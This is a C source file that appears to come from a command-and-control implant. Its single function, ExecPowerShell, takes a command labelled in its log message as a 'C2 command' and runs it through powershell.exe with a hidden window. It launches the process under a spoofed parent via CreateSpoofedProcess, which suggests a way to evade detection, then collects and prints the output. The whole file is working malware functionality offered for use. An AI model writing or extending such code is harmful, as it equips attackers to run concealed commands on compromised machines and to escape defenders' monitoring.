#include "..\helper.h"
#include "ExecutePowershell.h"

VOID ExecPowerShell(LPCWSTR psCommand) {
    WCHAR wrappedPsCmd[4096];

    wprintf(L"[*] Executing C2 command : %ls\n", psCommand);

    wsprintfW(
        wrappedPsCmd,
        L"powershell.exe -NoProfile -WindowStyle Hidden -Command \" %ls \"",psCommand
    );

    PROCESS_INFORMATION Pi = { 0 };
    HANDLE g_hChildStd_OUT_Rd = CreateSpoofedProcess(DEFAULT_SPOOFED_PROC, &Pi, wrappedPsCmd);

    ResumeThread(Pi.hThread);
    Sleep(2);

    CHAR* outputBuffer[4096] = { 0 };
    GetProcOutput(g_hChildStd_OUT_Rd, (PBYTE)outputBuffer, 4096);
    WaitForSingleObject(Pi.hProcess, INFINITE);
    

    printf("[*] PowerShell Output :\n%s\n", outputBuffer);
    
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
}